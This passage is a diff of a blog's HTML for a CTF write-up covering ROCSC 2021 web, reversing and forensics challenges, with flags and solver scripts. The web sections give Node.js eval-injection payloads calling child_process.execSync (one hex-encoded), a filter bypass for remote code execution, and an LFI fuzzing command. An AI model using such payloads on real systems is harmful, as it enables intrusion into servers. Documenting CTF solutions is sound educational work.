-<h4 id="Proof-of-Code-1"><a href="#Proof-of-Code-1" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
-<span class="token keyword">import</span> requests
-<span class="token keyword">import</span> hashlib
-<span class="token keyword">import</span> time
-<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup
+<h4 id="Proof-of-Code-1"><a href="#Proof-of-Code-1" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;python
+import requests
+import hashlib
+import time
+from bs4 import BeautifulSoup
 
-url <span class="token operator">=</span> <span class="token string">"http://35.246.178.49:30980"</span>
+url &#x3D; &quot;http:&#x2F;&#x2F;35.246.178.49:30980&quot;
 
-<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        timestamp <span class="token operator">=</span> <span class="token number">1628168161</span> <span class="token operator">+</span> <span class="token number">162</span>
-        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
-                code <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span>
-                r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> code<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
-                content <span class="token operator">=</span> r<span class="token punctuation">.</span>text
+def main():
+        timestamp &#x3D; 1628168161 + 162
+        while True:
+                code &#x3D; hashlib.md5(str(timestamp).encode()).hexdigest()
+                r &#x3D; requests.post(url, data&#x3D;&#123;&quot;code&quot;: code&#125;)
+                content &#x3D; r.text
 
-                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string">"ctf"</span> <span class="token keyword">in</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>
-                        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>
-                        <span class="token keyword">print</span><span class="token punctuation">(</span>soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">"p"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>text<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-                        <span class="token keyword">break</span>
+                if(&quot;ctf&quot; in content):
+                        soup &#x3D; BeautifulSoup(r.text, &quot;html.parser&quot;)
+                        print(soup.find_all(&quot;p&quot;)[-1].text.strip().split()[-1])
+                        break
 
-                timestamp <span class="token operator">+=</span> <span class="token number">1</span>
+                timestamp +&#x3D; 1
 
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
-        main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+        main()</code></pre>
 
 <h2 id="inodat-300-Web"><a href="#inodat-300-Web" class="headerlink" title="inodat(300): Web"></a>inodat(300): Web</h2><h4 id="Proof-of-Flag-4"><a href="#Proof-of-Flag-4" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>CTF{11a0aafa059bda95fdb80332309eb6368ddf4e572dadbe0c40dfe0be69bf515d}</p>
 <h4 id="Summary-4"><a href="#Summary-4" class="headerlink" title="Summary"></a>Summary</h4><p>We get a basic API webserver.</p>
 <h4 id="Proof-of-Solving-4"><a href="#Proof-of-Solving-4" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>We start with our basic enumeration and we find that it haves <strong>&#x2F;api&#x2F;v1</strong><br>So we scan again the <strong>&#x2F;api&#x2F;v1</strong> and we find the <strong>math</strong>.<br>Now we need to <strong>FUZZ</strong> math in order to find the <em>parameter</em><br>Until now everything looks almost the same like the challenge <em>CALCULUS</em><br>So I tried using the payload I had for <em>CALCULUS</em>, but on this one we don’t need the <strong>this.constructor.constructor</strong> part.</p>
 <p>MAIN PAYLOAD:</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">require</span><span class="token punctuation">(</span><span class="token string">"child_process"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">execSync</span><span class="token punctuation">(</span><span class="token string">"ls"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">require(&quot;child_process&quot;).execSync(&quot;ls&quot;).toString()</code></pre>
 
 <p>ENCODED PAYLOAD:</p>
-<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">eval</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span><span class="token string">'7265717569726528226368696c645f70726f6365737322292e6578656353796e632822636174207365637265745f666c61675f666f6c6465725f6164736173646f68692f666c61672e74787422292e746f537472696e672829'</span><span class="token punctuation">,</span><span class="token operator">+</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'ascii'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">eval(Buffer.from(&#39;7265717569726528226368696c645f70726f6365737322292e6578656353796e632822636174207365637265745f666c61675f666f6c6465725f6164736173646f68692f666c61672e74787422292e746f537472696e672829&#39;,+&#39;hex&#39;).toString(&#39;ascii&#39;))</code></pre>
 
 <p>But you can see that by using the MAIN payload it’s giving us a TRY HARDER !</p>
 <img src="/2021/12/08/rocsc-2021/20210830171928.png" class="">
@@ -242,88 +242,88 @@ url <span class="token operator">=</span> <span class="token string">"http://35.
 <h2 id="clueless-investigation-290-Rev"><a href="#clueless-investigation-290-Rev" class="headerlink" title="clueless_investigation(290): Rev"></a>clueless_investigation(290): Rev</h2><h4 id="Proof-of-Flag-5"><a href="#Proof-of-Flag-5" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>CTF{8ab6d5fe901104ead00fde56cb4766e4821bc7a7e3975f023f3130b690f8f7bb}</p>
 <h4 id="Summary-5"><a href="#Summary-5" class="headerlink" title="Summary"></a>Summary</h4><p>We get an x-sharelib, and a message encoded in <strong>morse code</strong><br>After decoding the message we get: <code>YJLEFYWFKQVUCOEWEPKBLHBKHRBKLOUXVNFP</code></p>
 <h4 id="Proof-of-Solving-5"><a href="#Proof-of-Solving-5" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>The binary is performing couple of checks on the given message, performing a custom encoding with strong dependency of the algorithm of Railfence cipher, but then the algorithm here differes a bit, first it changes the underscore to the chr(120), then change the string read from the message.txt file, making the string uppercase and then mapping the value by adding the value of ord(“A”) to character one by one, keeping the characters limited to 26 alphabetic character, then on the global array, it assigns the needed value which acts as indexing for encoding the message, provided changing the message taking the mapped array for substitution.<br>I got the global_array by using a custom docker where I runned <code>gdb-gef</code> and compared the inital string with what the output was mapping each char.</p>
-<h4 id="Proof-of-Code-2"><a href="#Proof-of-Code-2" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
+<h4 id="Proof-of-Code-2"><a href="#Proof-of-Code-2" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;python
 
-<span class="token keyword">def</span> <span class="token function">decryptRailFence</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> key<span class="token punctuation">)</span><span class="token punctuation">:</span>
+def decryptRailFence(cipher, key):
 
-    rail <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'\n'</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>
-                  <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span>
+    rail &#x3D; [[&#39;\n&#39; for i in range(len(cipher))]
+                  for j in range(key)]
 
-    dir_down <span class="token operator">=</span> <span class="token boolean">None</span>
-    row<span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
+    dir_down &#x3D; None
+    row, col &#x3D; 0, 0
 
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">if</span> row <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
-            dir_down <span class="token operator">=</span> <span class="token boolean">True</span>
-        <span class="token keyword">if</span> row <span class="token operator">==</span> key <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">:</span>
-            dir_down <span class="token operator">=</span> <span class="token boolean">False</span>
+    for i in range(len(cipher)):
+        if row &#x3D;&#x3D; 0:
+            dir_down &#x3D; True
+        if row &#x3D;&#x3D; key - 1:
+            dir_down &#x3D; False
 
-        rail<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'*'</span>
-        col <span class="token operator">+=</span> <span class="token number">1</span>
+        rail[row][col] &#x3D; &#39;*&#39;
+        col +&#x3D; 1
 
-        <span class="token keyword">if</span> dir_down<span class="token punctuation">:</span>
-            row <span class="token operator">+=</span> <span class="token number">1</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            row <span class="token operator">-=</span> <span class="token number">1</span>
+        if dir_down:
+            row +&#x3D; 1
+        else:
+            row -&#x3D; 1
 
-    index <span class="token operator">=</span> <span class="token number">0</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>rail<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'*'</span><span class="token punctuation">)</span> <span class="token keyword">and</span>
-               <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> <span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-                rail<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> cipher<span class="token punctuation">[</span>index<span class="token punctuation">]</span>
-                index <span class="token operator">+=</span> <span class="token number">1</span>
+    index &#x3D; 0
+    for i in range(key):
+        for j in range(len(cipher)):
+            if ((rail[i][j] &#x3D;&#x3D; &#39;*&#39;) and
+               (index &lt; len(cipher))):
+                rail[i][j] &#x3D; cipher[index]
+                index +&#x3D; 1
 
-    result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
-    row<span class="token punctuation">,</span> col <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span>
-    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>cipher<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    result &#x3D; []
+    row, col &#x3D; 0, 0
+    for i in range(len(cipher)):
 
-        <span class="token keyword">if</span> row <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
-            dir_down <span class="token operator">=</span> <span class="token boolean">True</span>
-        <span class="token keyword">if</span> row <span class="token operator">==</span> key<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
-            dir_down <span class="token operator">=</span> <span class="token boolean">False</span>
+        if row &#x3D;&#x3D; 0:
+            dir_down &#x3D; True
+        if row &#x3D;&#x3D; key-1:
+            dir_down &#x3D; False
 
-        <span class="token keyword">if</span> <span class="token punctuation">(</span>rail<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-            result<span class="token punctuation">.</span>append<span class="token punctuation">(</span>rail<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span><span class="token punctuation">)</span>
-            col <span class="token operator">+=</span> <span class="token number">1</span>
+        if (rail[row][col] !&#x3D; &#39;*&#39;):
+            result.append(rail[row][col])
+            col +&#x3D; 1
 
-        <span class="token keyword">if</span> dir_down<span class="token punctuation">:</span>
-            row <span class="token operator">+=</span> <span class="token number">1</span>
-        <span class="token keyword">else</span><span class="token punctuation">:</span>
-            row <span class="token operator">-=</span> <span class="token number">1</span>
-    <span class="token keyword">return</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">)</span>
+        if dir_down:
+            row +&#x3D; 1
+        else:
+            row -&#x3D; 1
+    return(&quot;&quot;.join(result))
 
-<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
-        global_array <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">,</span><span class="token number">32</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">15</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">25</span><span class="token punctuation">,</span><span class="token number">31</span><span class="token punctuation">,</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">18</span><span class="token punctuation">,</span><span class="token number">22</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">34</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">19</span><span class="token punctuation">,</span><span class="token number">21</span><span class="token punctuation">,</span><span class="token number">27</span><span class="token punctuation">,</span><span class="token number">29</span><span class="token punctuation">,</span><span class="token number">35</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">28</span><span class="token punctuation">]</span>
+if __name__&#x3D;&#x3D;&quot;__main__&quot;:
+        global_array &#x3D; [0,8,16,24,32,1,7,9,15,17,23,25,31,33,2,6,10,14,18,22,26,30,34,3,5,11,13,19,21,27,29,35,4,12,20,28]
 
-        org <span class="token operator">=</span> <span class="token string">"YJLEFYWFKQVUCOEWEPKBLHBKHRBKLOUXVNFP"</span>
-        org <span class="token operator">=</span> <span class="token punctuation">[</span>x <span class="token keyword">for</span> x <span class="token keyword">in</span> org<span class="token punctuation">]</span>
-        ceva <span class="token operator">=</span> decryptRailFence<span class="token punctuation">(</span>org<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span>
+        org &#x3D; &quot;YJLEFYWFKQVUCOEWEPKBLHBKHRBKLOUXVNFP&quot;
+        org &#x3D; [x for x in org]
+        ceva &#x3D; decryptRailFence(org, 5)
 
-        offset_upper <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"Z"</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span>
-        offset_lower <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"z"</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span>
-        ord_A <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span>
+        offset_upper &#x3D; ord(&quot;Z&quot;) - ord(&quot;A&quot;)
+        offset_lower &#x3D; ord(&quot;z&quot;) - ord(&quot;a&quot;)
+        ord_A &#x3D; ord(&quot;A&quot;)
 
-        result <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span> <span class="token builtin">len</span><span class="token punctuation">(</span>global_array<span class="token punctuation">)</span>
-        final <span class="token operator">=</span> <span class="token string">"AIXVUAAIXVW"</span>
-        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>global_array<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
-                <span class="token keyword">if</span> i <span class="token operator">&lt;</span> <span class="token number">26</span><span class="token punctuation">:</span>
-                        offset_upper <span class="token operator">=</span> org<span class="token punctuation">[</span>global_array<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>
-                        offset_upper <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>offset_upper<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span>
-                        offset_upper <span class="token operator">=</span> <span class="token punctuation">(</span>offset_upper <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
-                        offset_upper <span class="token operator">=</span> <span class="token number">25</span> <span class="token operator">-</span> offset_upper
-                        offset_upper <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>offset_upper <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-                        result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> offset_upper
-                <span class="token keyword">else</span><span class="token punctuation">:</span>
-                        offset_upper <span class="token operator">=</span> org<span class="token punctuation">[</span>global_array<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>
-                        offset_upper <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>offset_upper<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span>
-                        f <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>final<span class="token punctuation">[</span>i <span class="token operator">%</span> <span class="token number">26</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span>
-                        offset_upper <span class="token operator">=</span> <span class="token number">25</span> <span class="token operator">-</span> offset_upper
-                        offset_upper <span class="token operator">=</span> <span class="token punctuation">(</span>offset_upper <span class="token operator">+</span> f<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">26</span>
-                        offset_upper <span class="token operator">=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>offset_upper <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">"A"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-                        result<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> offset_upper
+        result &#x3D; [0]* len(global_array)
+        final &#x3D; &quot;AIXVUAAIXVW&quot;
+        for i in range(len(global_array)):
+                if i &lt; 26:
+                        offset_upper &#x3D; org[global_array.index(i)]
+                        offset_upper &#x3D; ord(offset_upper) - ord(&quot;A&quot;)
+                        offset_upper &#x3D; (offset_upper + i) % 26
+                        offset_upper &#x3D; 25 - offset_upper
+                        offset_upper &#x3D; chr(offset_upper + ord(&quot;A&quot;))
+                        result[i] &#x3D; offset_upper
+                else:
+                        offset_upper &#x3D; org[global_array.index(i)]
+                        offset_upper &#x3D; ord(offset_upper) - ord(&quot;A&quot;)
+                        f &#x3D; ord(final[i % 26]) - ord(&quot;A&quot;)
+                        offset_upper &#x3D; 25 - offset_upper
+                        offset_upper &#x3D; (offset_upper + f) % 26
+                        offset_upper &#x3D; chr(offset_upper + ord(&quot;A&quot;))
+                        result[i] &#x3D; offset_upper
 
-        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"X"</span><span class="token punctuation">,</span> <span class="token string">"_"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+        print(&quot;&quot;.join(result).replace(&quot;X&quot;, &quot;_&quot;))</code></pre>
 
 <h2 id="calculus-300-Web"><a href="#calculus-300-Web" class="headerlink" title="calculus(300): Web"></a>calculus(300): Web</h2><h4 id="Proof-of-Flag-6"><a href="#Proof-of-Flag-6" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>CTF{de71c185bcc37c8b169f7bb4c1c0bd3c7fe041110ae4d176434d396c2de52121}</p>
 <h4 id="Summary-6"><a href="#Summary-6" class="headerlink" title="Summary"></a>Summary</h4><p>We get a <strong>web calculator</strong> which should do some basic arithmetic calculations.<br>We can see that if we try to press a button or something it’s not working so I started to guess the parameter for the calculator to work.</p>
@@ -335,7 +335,7 @@ url <span class="token operator">=</span> <span class="token string">"http://35.
 
 <p>So that means in the <strong>backend</strong> it’s using <strong>eval()</strong><br>So in order to get the flag we need to bypass the <strong>eval()</strong>.</p>
 <p>I didn’t know how to bypass the <strong>eval()</strong> so I started to search for past writeups that look like this and I found this one from GoogleCTF: <a target="_blank" rel="noopener" href="https://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html">https://blog.orange.tw/2018/06/google-ctf-2018-quals-web-gcalc.html</a><br>I modified it a little bit and with a little bit of help from a past payload that I had I’ve made this one: </p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?a<span class="token operator">=</span>this.constructor.constructor<span class="token punctuation">(</span>%22return%20process%22<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span>.mainModule.require<span class="token punctuation">(</span>%27child_process%27<span class="token punctuation">)</span>.execSync%20<span class="token punctuation">(</span>%27ls%27<span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>sda<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">?a&#x3D;this.constructor.constructor(%22return%20process%22)().mainModule.require(%27child_process%27).execSync%20(%27ls%27)&amp;b&#x3D;sda</code></pre>
 <p>But guess what ? The payload it’s not working so after some time poking with this and trying to bypass the filtering or the blacklist I found that if you enter a “ “ after execSync you can bypass this and earn RCE.</p>
 <img src="/2021/12/08/rocsc-2021/20210830143054.png" class="">
 
@@ -345,96 +345,96 @@ url <span class="token operator">=</span> <span class="token string">"http://35.
 <img src="/2021/12/08/rocsc-2021/20210830143625.png" class="">
 
 <h4 id="Proof-of-Solving-7"><a href="#Proof-of-Solving-7" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>I used this command in order to fuzz the possible LFI combinations:</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wfuzz <span class="token parameter variable">-c</span> <span class="token parameter variable">-w</span> fuzz.txt <span class="token parameter variable">--hw</span> <span class="token number">28</span> http://35.246.178.49:30603/local?image_name<span class="token operator">=</span>FUZZ<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wfuzz -c -w fuzz.txt --hw 28 http:&#x2F;&#x2F;35.246.178.49:30603&#x2F;local?image_name&#x3D;FUZZ</code></pre>
 
 <p>We found a lot of interesting stuff but after checking every single one of them we found nothing…<br>So I started to crawl a list of linux subsystem files and FUZZ after them…<br>After a little bit of time we got a hit on <strong>&#x2F;tmp&#x2F;flag</strong><br>Inside was the <em>hidden</em> flag</p>
 <h2 id="Little-endian-photo-340-Forensics"><a href="#Little-endian-photo-340-Forensics" class="headerlink" title="Little-endian-photo(340): Forensics"></a>Little-endian-photo(340): Forensics</h2><h4 id="Proof-of-Flag-8"><a href="#Proof-of-Flag-8" class="headerlink" title="Proof of Flag"></a>Proof of Flag</h4><p>ctf{112687d319c48cc38709a90b34d6df10904711b93a74b27f73d9382ff64053a0}</p>
 <h4 id="Summary-8"><a href="#Summary-8" class="headerlink" title="Summary"></a>Summary</h4><p>We get a broken <strong>PNG</strong> image with lots of data in it.<br>The only problem that we have is that we don’t know the IMAGExSIZE.</p>
 <h4 id="Proof-of-Solving-8"><a href="#Proof-of-Solving-8" class="headerlink" title="Proof of Solving"></a>Proof of Solving</h4><p>There was a little bit of guess but not that much.<br>We know that there are <strong>1240800</strong> <em>pixels</em>.<br>We know that normally the photo should be 1000x1000 ( normally because <strong>MODERN</strong> times)<br>So we need to find a number that multiplied with 1000 should be equal to the number of pixels.</p>
-<h4 id="Proof-of-Code-3"><a href="#Proof-of-Code-3" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
-<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image
+<h4 id="Proof-of-Code-3"><a href="#Proof-of-Code-3" class="headerlink" title="Proof of Code"></a>Proof of Code</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">#!&#x2F;usr&#x2F;bin&#x2F;python
+from PIL import Image
 
-<span class="token keyword">def</span> <span class="token function">_saveImage</span><span class="token punctuation">(</span>img<span class="token punctuation">,</span> imgsize<span class="token punctuation">,</span> destFile<span class="token punctuation">)</span><span class="token punctuation">:</span>
-        mode <span class="token operator">=</span> <span class="token string">'RGBA'</span>
-        arr <span class="token operator">=</span> img<span class="token punctuation">.</span>reshape<span class="token punctuation">(</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">*</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
-        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>arr<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">:</span>
